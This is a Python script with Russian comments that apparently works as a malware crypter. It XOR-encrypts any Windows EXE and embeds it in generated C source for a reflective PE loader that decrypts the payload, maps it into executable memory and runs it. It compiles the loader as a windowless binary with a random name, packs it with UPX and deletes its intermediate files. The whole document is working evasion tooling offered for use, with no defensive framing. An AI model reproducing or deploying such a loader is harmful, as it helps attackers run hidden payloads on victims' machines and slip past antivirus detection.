import os
import sys
import subprocess
import random
import string

def generate_random_name():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def build_single_exe_with_dll(exe_path):
    print("=" * 60)
    print("PROFESSIONAL BINARY REFLECTIVE LOADER")
    print("=" * 60)
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        return None
    
    output_dir = os.path.dirname(exe_path)
    
    print("Reading source EXE...")
    with open(exe_path, 'rb') as f:
        exe_data = f.read()
    
    print(f"Source size: {len(exe_data) / (1024*1024):.1f} MB")
    
    if len(exe_data) < 2 or exe_data[0] != 0x4D or exe_data[1] != 0x5A:
        print("ERROR: Not a valid EXE file (missing MZ header)!")
        return None
    print("EXE header OK (MZ)")
    
    print("Encrypting with XOR...")
    key = os.urandom(32)
    encrypted = bytearray()
    for i, byte in enumerate(exe_data):
        encrypted.append(byte ^ key[i % len(key)])
    
    # Сохраняем как бинарные .bin файлы
    data_bin = os.path.join(output_dir, 'data.bin')
    with open(data_bin, 'wb') as f:
        f.write(encrypted)
    
    key_bin = os.path.join(output_dir, 'key.bin')
    with open(key_bin, 'wb') as f:
        f.write(key)
    
    print("Creating loader with embedded binary...")
    
    loader_code = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")

// Внешние бинарные данные (линкуются через objcopy)
extern unsigned char _binary_data_bin_start[];
extern unsigned char _binary_data_bin_end[];
extern unsigned char _binary_key_bin_start[];
extern unsigned char _binary_key_bin_end[];

// Reflective PE loader
void run_pe(unsigned char* pe_data, size_t pe_size) {
    if (pe_data[0] != 'M' || pe_data[1] != 'Z') return;
    
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe_data;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pe_data + dos->e_lfanew);
    
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;
    
    size_t image_size = nt->OptionalHeader.SizeOfImage;
    unsigned char* base = (unsigned char*)VirtualAlloc(
        NULL, image_size, MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    if (!base) return;
    
    memcpy(base, pe_data, nt->OptionalHeader.SizeOfHeaders);
    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData) {
            memcpy(base + section[i].VirtualAddress, 
                   pe_data + section[i].PointerToRawData, 
                   section[i].SizeOfRawData);
        }
    }
    
    DWORD delta = (DWORD)base - nt->OptionalHeader.ImageBase;
    if (delta) {
        PIMAGE_BASE_RELOCATION rel = (PIMAGE_BASE_RELOCATION)(
            base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
        );
        while (rel->VirtualAddress) {
            DWORD count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* entries = (WORD*)(rel + 1);
            for (DWORD i = 0; i < count; i++) {
                if (entries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                    DWORD* addr = (DWORD*)(base + rel->VirtualAddress + (entries[i] & 0xFFF));
                    *addr += delta;
                }
            }
            rel = (PIMAGE_BASE_RELOCATION)((char*)rel + rel->SizeOfBlock);
        }
    }
    
    PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(
        base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
    );
    while (imp->Name) {
        HMODULE h = LoadLibraryA((char*)base + imp->Name);
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(base + imp->OriginalFirstThunk);
        PIMAGE_THUNK_DATA func = (PIMAGE_THUNK_DATA)(base + imp->FirstThunk);
        while (thunk->u1.Function) {
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                func->u1.Function = (DWORD)GetProcAddress(h, (char*)(thunk->u1.Ordinal & 0xFFFF));
            } else {
                PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)(base + thunk->u1.AddressOfData);
                func->u1.Function = (DWORD)GetProcAddress(h, name->Name);
            }
            thunk++;
            func++;
        }
        imp++;
    }
    
    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress) {
        PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)(
            base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress
        );
        if (tls->AddressOfCallBacks) {
            PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
            while (*callback) {
                (*callback)(base, DLL_PROCESS_ATTACH, NULL);
                callback++;
            }
        }
    }
    
    DWORD entry = nt->OptionalHeader.AddressOfEntryPoint;
    if (entry) {
        ((void(*)()) (base + entry))();
    }
}

void run_payload() {
    // Получаем данные из бинарных секций
    size_t data_size = _binary_data_bin_end - _binary_data_bin_start;
    size_t key_size = _binary_key_bin_end - _binary_key_bin_start;
    
    unsigned char* data = _binary_data_bin_start;
    unsigned char* key = _binary_key_bin_start;
    
    // Копируем и расшифровываем
    unsigned char* decrypted = (unsigned char*)malloc(data_size);
    if (!decrypted) return;
    memcpy(decrypted, data, data_size);
    
    for (size_t i = 0; i < data_size; i++) {
        decrypted[i] ^= key[i % key_size];
    }
    
    if (decrypted[0] != 'M' || decrypted[1] != 'Z') {
        MessageBoxA(NULL, "Not a valid EXE!", "Error", MB_OK);
        free(decrypted);
        return;
    }
    
    run_pe(decrypted, data_size);
    free(decrypted);
}

int main() {
    run_payload();
    Sleep(15000);
    return 0;
}
'''
    
    loader_src = os.path.join(output_dir, 'loader.c')
    with open(loader_src, 'w', encoding='utf-8') as f:
        f.write(loader_code)
    
    print("Creating binary objects...")
    
    # Конвертируем .bin в .o с помощью objcopy
    data_obj = os.path.join(output_dir, 'data.o')
    key_obj = os.path.join(output_dir, 'key.o')
    
    subprocess.run(['objcopy', '-I', 'binary', '-O', 'elf32-i386', '-B', 'i386', data_bin, data_obj], capture_output=True)
    subprocess.run(['objcopy', '-I', 'binary', '-O', 'elf32-i386', '-B', 'i386', key_bin, key_obj], capture_output=True)
    
    print("Compiling reflective loader...")
    loader_exe = os.path.join(output_dir, f'loader_{generate_random_name()}.exe')
    
    cmd = [
        'gcc',
        loader_src,
        data_obj,
        key_obj,
        '-o', loader_exe,
        '-O3',
        '-s',
        '-static',
        '-Wl,--subsystem,windows',
        '-mwindows'
    ]
    
    try:
        result = subprocess.run(cmd, check=True, capture_output=True)
        print("Compilation OK")
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed: {e.stderr.decode()}")
        return None
    
    print("Compressing with UPX...")
    try:
        subprocess.run(['upx', '--best', loader_exe], capture_output=True, check=True)
        print("UPX compression OK")
    except:
        print("UPX compression skipped or failed")
    
    final_size = os.path.getsize(loader_exe) / (1024 * 1024)
    
    print("=" * 60)
    print("DONE")
    print(f"Output: {loader_exe}")
    print(f"Size: {final_size:.2f} MB")
    print("=" * 60)
    
    # Cleanup
    try:
        os.remove(loader_src)
        os.remove(data_bin)
        os.remove(key_bin)
        os.remove(data_obj)
        os.remove(key_obj)
    except:
        pass
    
    return loader_exe

if __name__ == "__main__":
    exe_path = "dist/temp.exe"
    
    if len(sys.argv) > 1:
        exe_path = sys.argv[1]
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        sys.exit(1)
    
    build_single_exe_with_dll(exe_path)
